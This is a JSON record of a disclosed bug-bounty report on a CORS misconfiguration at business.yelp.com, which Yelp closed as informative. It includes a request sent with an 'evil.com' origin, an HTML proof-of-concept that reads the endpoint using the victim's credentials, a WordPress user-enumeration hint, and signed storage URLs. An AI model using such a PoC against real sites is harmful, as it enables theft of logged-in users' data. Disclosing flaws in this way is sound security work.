@@ -1,0 +1,318 @@
+{
+    "id": 1707616,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzA3NjE2",
+    "url": "https://hackerone.com/reports/1707616",
+    "title": "CORS Misconfiguration on Yelp",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "medium",
+    "readable_substate": "Informative",
+    "created_at": "2022-09-21T16:13:35.603Z",
+    "submitted_at": "2022-09-21T16:13:35.691Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "qualw1n",
+        "url": "/qualw1n",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/13fyf5yr18vwckbahj60u2m9aokx/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": true,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 545,
+        "url": "https://hackerone.com/yelp",
+        "handle": "yelp",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Yelp",
+            "twitter_handle": "",
+            "website": "https://www.yelp.com",
+            "about": "Connecting people to great local businesses in communities around the world."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2022-09-28T03:43:10.963Z",
+    "bug_reporter_agreed_on_going_public_at": "2022-09-28T03:43:10.891Z",
+    "team_member_agreed_on_going_public_at": "2022-09-27T22:57:17.579Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Entry\nAn cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page\n\n## Description:\nCORS misconfiguration is found on business.yelp.com as Access-Control-Allow-Credentials: true.\n\n## Steps to reproduce:\n\nVisit business site.\n\n## Request\nGET /wp-json HTTP/2\nHost: business.yelp.com\nSec-Ch-Ua: \"Chromium\";v=\"105\", \"Not)A;Brand\";v=\"8\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\nOrigin: evil.com\n\n## Response\nAllow: GET\nAccess-Control-Allow-Origin: http://evil.com\nAccess-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE\nAccess-Control-Allow-Credentials: true\n\n## POC\n<!DOCTYPE html>\n<html>\n    <head>\n        <script>\n            function cors() {\n                var xhttp=new XMLHttpRequest();\n                    xhttp.onreadystatechange= function() {\n                        if (this.readyState == 4 && this.status ==200){\n                            document.getElementById(\"emo\").innerHTML=alert(this.responseText\n                                );\n                        }\n                };\n                xhttp.open('GET',\"https://business.yelp.com/wp-json/\",true);\n                xhttp.withCredentials=true;\n                xhttp.send();\n            }\n        </script>\n    </head>\n    <body>\n        <center>\n        <h2>[!]CORS P0C - Qualw1n</h2>\n        <div id=\"demo\">\n            <button type=\"button\" onclick=\"cors()\">Exploit</button> \n        </div>\n        </center>\n    </body>\n</html>\n\n## Photo\n{F1945188}\n\n## Impact\n\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.\nAlso If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.",
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 1945188,
+            "file_name": "image.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dbgusl914o04v65qhnu4qoxywpjo?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6BUFUEE%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T065929Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDD9FHXU0ld2gtz64ZpnjlAw950FEQMqICGzFbRk4pC0AIhAMguqPvT6svEZTrq0b2WG76XHZFVJtNfIkDZQTZEBAWsKrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgygpHklaEgyfIVznI8qjwWOIdWktDm9Jabt75qlpVIMtXS%2FssDvdH3liIUrqSO%2Fn2cugELxTHsITAFkdxtpuIqUfC022kq1x7KnVsJ8dbHLeYcjqR%2BmyMsSM7Xr6UnozwhB4Y9cX%2F6UxIQ4Shov2Zz%2B4D9ygjyO8TAHyL4iD%2B6CaUtaTRDQPU4E5CflxhSrTzcxVSW%2BqeTqxyYZggcMEnSIhCb9IgOZ920mfAKlQNAc9hEp1VBpmPzgJ45%2F2pnRD4bAeZccOTQ2N7ai9tDdrydJZNrpSPB7gPdG8BDlQdEVpOmjIqxieGAy0zoKfSOl%2F5VHAxD0l8CodVdcp4kMEcdDDDNKGFD%2BYvWC25TJ5mw59Uk5USrQymohsM1fenBd610Hv6tbF2BGQAVrViDT2nJXnDxNQyRmqsIbJeitdGdnlpUpx45ObdZIcNmzHof%2FPv%2FVqoTgI06D0Wk6Z63VBvlhxWqLe%2BSaLcx2GAU%2Fy14hWDJEf7ZqhZ%2BM9OJtRIxfWXKISDxoTmTfZp%2F5B%2FiqubY1RL%2FDk%2BkMTxMcbSGw43o6kyeDbQbyyaDtV%2BYAWvx%2BSe9%2FhRFQPmqTdKCb%2BT23vEPLhAJ2vYsQ%2BTTeLcxLwsZ3TUOVQTBnE3%2FUfsxEMeVHPai2qUl0CGsun0HgjD95lQIzmeHal%2B%2BEP6LBM8JhmIfrmEmxecDlEpJEWMvTnef%2FUlhfSrGHNndRTanOi%2BSbxAkMtWE84y5d6km2hMzs9vO8ITHcwoDqJD9MHDjIWYVJG9MlQbnFckuSFWS1rIVtaRMcayfrXSfW9hMolo%2BRqzfol8wiNwiDk%2FCKe151LpjhbW4NYcVDBPgw8tG9ATi5pkPIxbtfE3grt%2BpRK%2Faq2%2F5BArkGIJcrN5tzOoFCLeiuMLOltqcGOrABo0TqeJmB%2BrDGBqaoTHwPAvK4%2FwgcpFFUm8NwdvRQDqlRqJax0yb%2BBe6w2ez9ShfsMMqJTOyg4Y%2FE%2BuAcIW10gTr%2BvpIXBkF%2F8x6GDpOA2qbdCvafgrSufD%2B5I4%2BvTz5e4TgiIX3QWw7OH4QNLX1OUdaUk3t0Pz5pXzlKIOWV579ZeH8AP1NSW2e%2Fj%2B8nGME4HiDOlB%2BZW%2FO8raM%2BngBp42hfPK0q4CctRMJh8z2fdSQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=823740a3abbad3f941df0f0478705b114bf595097efe89fb6d1cd2e9ddb93604",
+            "file_size": 34692,
+            "type": "image/png"
+        },
+        {
+            "id": 1945192,
+            "file_name": "2022-09-21_19-12-05.mkv",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tv559lukkpn6a7doc4sbk6n7wypq?response-content-disposition=attachment%3B%20filename%3D%222022-09-21_19-12-05.mkv%22%3B%20filename%2A%3DUTF-8%27%272022-09-21_19-12-05.mkv&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6BUFUEE%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T065929Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDD9FHXU0ld2gtz64ZpnjlAw950FEQMqICGzFbRk4pC0AIhAMguqPvT6svEZTrq0b2WG76XHZFVJtNfIkDZQTZEBAWsKrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgygpHklaEgyfIVznI8qjwWOIdWktDm9Jabt75qlpVIMtXS%2FssDvdH3liIUrqSO%2Fn2cugELxTHsITAFkdxtpuIqUfC022kq1x7KnVsJ8dbHLeYcjqR%2BmyMsSM7Xr6UnozwhB4Y9cX%2F6UxIQ4Shov2Zz%2B4D9ygjyO8TAHyL4iD%2B6CaUtaTRDQPU4E5CflxhSrTzcxVSW%2BqeTqxyYZggcMEnSIhCb9IgOZ920mfAKlQNAc9hEp1VBpmPzgJ45%2F2pnRD4bAeZccOTQ2N7ai9tDdrydJZNrpSPB7gPdG8BDlQdEVpOmjIqxieGAy0zoKfSOl%2F5VHAxD0l8CodVdcp4kMEcdDDDNKGFD%2BYvWC25TJ5mw59Uk5USrQymohsM1fenBd610Hv6tbF2BGQAVrViDT2nJXnDxNQyRmqsIbJeitdGdnlpUpx45ObdZIcNmzHof%2FPv%2FVqoTgI06D0Wk6Z63VBvlhxWqLe%2BSaLcx2GAU%2Fy14hWDJEf7ZqhZ%2BM9OJtRIxfWXKISDxoTmTfZp%2F5B%2FiqubY1RL%2FDk%2BkMTxMcbSGw43o6kyeDbQbyyaDtV%2BYAWvx%2BSe9%2FhRFQPmqTdKCb%2BT23vEPLhAJ2vYsQ%2BTTeLcxLwsZ3TUOVQTBnE3%2FUfsxEMeVHPai2qUl0CGsun0HgjD95lQIzmeHal%2B%2BEP6LBM8JhmIfrmEmxecDlEpJEWMvTnef%2FUlhfSrGHNndRTanOi%2BSbxAkMtWE84y5d6km2hMzs9vO8ITHcwoDqJD9MHDjIWYVJG9MlQbnFckuSFWS1rIVtaRMcayfrXSfW9hMolo%2BRqzfol8wiNwiDk%2FCKe151LpjhbW4NYcVDBPgw8tG9ATi5pkPIxbtfE3grt%2BpRK%2Faq2%2F5BArkGIJcrN5tzOoFCLeiuMLOltqcGOrABo0TqeJmB%2BrDGBqaoTHwPAvK4%2FwgcpFFUm8NwdvRQDqlRqJax0yb%2BBe6w2ez9ShfsMMqJTOyg4Y%2FE%2BuAcIW10gTr%2BvpIXBkF%2F8x6GDpOA2qbdCvafgrSufD%2B5I4%2BvTz5e4TgiIX3QWw7OH4QNLX1OUdaUk3t0Pz5pXzlKIOWV579ZeH8AP1NSW2e%2Fj%2B8nGME4HiDOlB%2BZW%2FO8raM%2BngBp42hfPK0q4CctRMJh8z2fdSQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b2d0f51c5e145263a5c3ef5f7ecbd1b508ceae6db2b8bd2410093a6846784c24",
+            "file_size": 1931533,
+            "type": "video/x-matroska"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 15,
+    "voters": [
+        "shuvam321",
+        "qualw1n",
+        "shubham_srt",
+        "mr_negative",
+        "ashrafabdelrazik",
+        "l3pr3ch4un",
+        "shivammusic",
+        "purejenix",
+        "shahnawazariffe1",
+        "yasaihero",
+        "and 5 more..."
+    ],
+    "severity": {
+        "rating": "medium",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 43913,
+        "asset_type": "WILDCARD",
+        "asset_identifier": "*.yelp.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 18472433,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi there!\n\nThanks for submitting your report to us! Please expect a response within a week.\n\nBest,\nThe Yelp Security Team\n",
+            "automated_response": true,
+            "created_at": "2022-09-21T16:18:40.371Z",
+            "updated_at": "2022-09-21T16:18:40.371Z",
+            "actor": {
+                "url": "/yelp",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Yelp"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 18472518,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Referer: https://hackerone.com/reports/1527555",
+            "automated_response": false,
+            "created_at": "2022-09-21T16:30:32.784Z",
+            "updated_at": "2022-09-21T16:30:32.784Z",
+            "actor": {
+                "username": "qualw1n",
+                "cleared": false,
+                "verified": true,
+                "url": "/qualw1n",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/13fyf5yr18vwckbahj60u2m9aokx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 18493785,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi there!\nThanks for submitting your report to us!\nWe are investigating the reported issue and will update this thread once we have further details.\nBest,\nThe Yelp Security Team",
+            "automated_response": false,
+            "created_at": "2022-09-22T21:55:23.249Z",
+            "updated_at": "2022-09-22T21:55:23.249Z",
+            "actor": {
+                "username": "ttibbel",
+                "cleared": false,
+                "verified": false,
+                "url": "/ttibbel",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 18508196,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hint:\n\nhttps://business.yelp.com/wp-json/wp/v2/users\n\n[\"id\":40,\"name\":\"Adam Klekotka\"]\n\nit can be combined with the proof I mentioned above.",
+            "automated_response": false,
+            "created_at": "2022-09-23T18:19:09.785Z",
+            "updated_at": "2022-09-23T18:19:09.785Z",
+            "actor": {
+                "username": "qualw1n",
+                "cleared": false,
+                "verified": true,
+                "url": "/qualw1n",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/13fyf5yr18vwckbahj60u2m9aokx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 18555414,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "Hi @qualwin3001,\n\nThank you for your submission. I have reviewed your report and determined that the behavior shown does not represent a material risk to Yelp or its users.\n\nBest,\nYelp Security",
+            "automated_response": false,
+            "created_at": "2022-09-27T22:57:10.354Z",
+            "updated_at": "2022-09-27T22:57:10.354Z",
+            "actor": {
+                "username": "calvinli",
+                "cleared": false,
+                "verified": false,
+                "url": "/calvinli",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 18555415,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-09-27T22:57:17.606Z",
+            "updated_at": "2022-09-27T22:57:17.606Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "calvinli",
+                "cleared": false,
+                "verified": false,
+                "url": "/calvinli",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 18556089,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-09-28T03:43:10.929Z",
+            "updated_at": "2022-09-28T03:43:10.929Z",
+            "actor": {
+                "username": "qualw1n",
+                "cleared": false,
+                "verified": true,
+                "url": "/qualw1n",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/13fyf5yr18vwckbahj60u2m9aokx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 18556090,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-09-28T03:43:11.025Z",
+            "updated_at": "2022-09-28T03:43:11.025Z",
+            "actor": {
+                "username": "qualw1n",
+                "cleared": false,
+                "verified": true,
+                "url": "/qualw1n",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/13fyf5yr18vwckbahj60u2m9aokx/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
